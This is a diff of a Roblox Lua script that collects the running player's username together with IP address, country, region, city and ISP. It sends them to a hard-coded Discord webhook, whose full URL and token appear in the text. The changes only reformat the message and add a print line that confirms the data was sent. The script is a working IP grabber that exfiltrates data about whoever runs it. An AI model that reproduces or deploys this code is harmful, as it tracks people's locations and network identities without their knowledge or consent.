@@ -1,5 +1,6 @@
-local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1357004600913301725/UDXK3-eydnPjc8tuHanZmmNmQu5_ZuoHtmRfuWuoddnWVUoVSQltIXp1IvtAyUnA7_nq"
+local WebhookURL = "https://discord.com/api/webhooks/1357004600913301725/UDXK3-eydnPjc8tuHanZmmNmQu5_ZuoHtmRfuWuoddnWVUoVSQltIXp1IvtAyUnA7_nq" -- Replace with your webhook URL
+local player = game:GetService("Players").LocalPlayer
+local username = player.Name
 
 -- Function to send HTTP requests safely
 local function safeRequest(options)
@@ -48,12 +49,12 @@ local FI = {
 }
 
 -- Format the message
-local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", 
-    name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local dataMessage = string.format(
+    "**Executed by:** %s\n\n**IP Info:**\nIP: %s\nCountry: %s\nRegion: %s\nCity: %s\nISP: %s", 
+    username, FI.IP, FI.country, FI.regionName, FI.city, FI.isp
+)
 
-local MessageData = {
-    ["content"] = dataMessage
-}
+local MessageData = { ["content"] = dataMessage }
 
 -- Send data to Discord webhook
 safeRequest({
@@ -62,3 +63,5 @@ safeRequest({
     Headers = { ["Content-Type"] = "application/json" },
     Body = game:GetService("HttpService"):JSONEncode(MessageData)
 })
+
+print("Username and IP info sent to Discord: " .. username)
